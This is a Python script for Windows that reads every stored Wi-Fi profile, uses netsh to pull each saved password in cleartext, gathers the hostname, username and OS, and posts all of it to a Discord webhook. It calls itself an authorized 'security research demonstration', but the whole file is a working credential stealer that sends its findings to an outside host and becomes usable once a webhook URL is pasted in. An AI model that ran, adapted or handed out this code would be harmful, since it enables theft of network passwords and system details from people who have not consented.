import subprocess
import requests
import platform
import getpass
import socket
import datetime

def list_wifi_profiles():
    """
    Retrieve a list of all Wi-Fi profiles stored on the system.
    Returns:
        list: A list of all Wi-Fi profile names.
    """
    try:
        output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True)
        profiles = []
        for line in output.splitlines():
            if "All User Profile" in line:
                try:
                    profile = line.split(":")[1].strip()
                    if profile:  # Only add non-empty profiles
                        profiles.append(profile)
                except IndexError:
                    continue
        return profiles
    except subprocess.CalledProcessError as e:
        print(f"\nError listing Wi-Fi profiles:\n- {e}")
        return []

def get_wifi_password(profile_name):
    """
    Retrieve the password for a specified Wi-Fi profile.
    Args:
        profile_name (str): The name of the Wi-Fi profile.
    Returns:
        str: The password of the Wi-Fi profile, or a message if not found.
    """
    try:
        escaped_name = profile_name.replace('"', '""')  # Escape double quotes
        command = ["netsh", "wlan", "show", "profile", f"name={escaped_name}", "key=clear"]
        output = subprocess.check_output(command, text=True)

        # Check for authentication type
        auth_lines = [line for line in output.splitlines() if "Authentication" in line]
        if auth_lines:
            auth_type = auth_lines[0].split(":")[-1].strip()

        password_lines = [line for line in output.splitlines() if "Key Content" in line]
        if not password_lines:
            security_lines = [line for line in output.splitlines() if "Security key" in line]
            if security_lines and "Absent" in security_lines[0]:
                return "Open network - no password"
            return "Password cannot be retrieved"

        password = password_lines[0].split(":")[-1].strip()
        return password if password else "Password hidden or unavailable"

    except subprocess.CalledProcessError as e:
        return f"Access denied: {str(e)}"

def get_system_info():
    """
    Gather basic system information for research documentation.
    """
    return {
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": platform.platform(),
        "research_note": "Security demonstration on authorized system only"
    }

def get_all_data(webhook_url):
    """
    Send stored Wi-Fi profiles to Discord webhook for security research demonstration.
    Only use on systems you are authorized to test.
    
    Args:
        webhook_url (str): The Discord webhook URL to send the data to.
    """
    print("\n:: Security Research Demo - Collecting Wi-Fi Profiles ::")

    # Gather system info
    sys_info = get_system_info()

    # Format message header with research context
    message = (
        f"```\n"
        f"Security Research Documentation\n"
        f"Timestamp: {sys_info['timestamp']}\n"
        f"System: {sys_info['hostname']}\n"
        f"OS: {sys_info['os']}\n"
        f"Note: {sys_info['research_note']}\n"
        f"\nStored Wi-Fi Profiles:\n"
    )

    # Get WiFi profiles
    wifi_profiles = list_wifi_profiles()
    if not wifi_profiles:
        message += "\nNo Wi-Fi profiles found."
    else:
        for profile in wifi_profiles:
            password = get_wifi_password(profile)
            message += f"\nProfile: {profile}\nPassword: {password}\n"

    message += "```"  # Close code block formatting

    # Send to webhook
    try:
        response = requests.post(webhook_url, json={"content": message})
        if response.status_code == 204:
            print("Research data sent successfully")
        else:
            print(f"Error sending data: {response.status_code}")
    except Exception as e:
        print(f"Failed to send data: {str(e)}")

def main():
    # Replace with your Discord webhook URL
    webhook_url = "ENTER_YOUR_DISCORD_WEBHOOK" # Upadate this with your Discord webhook URL for passwords to be sent to Discord
    get_all_data(webhook_url)

if __name__ == "__main__":
    main()
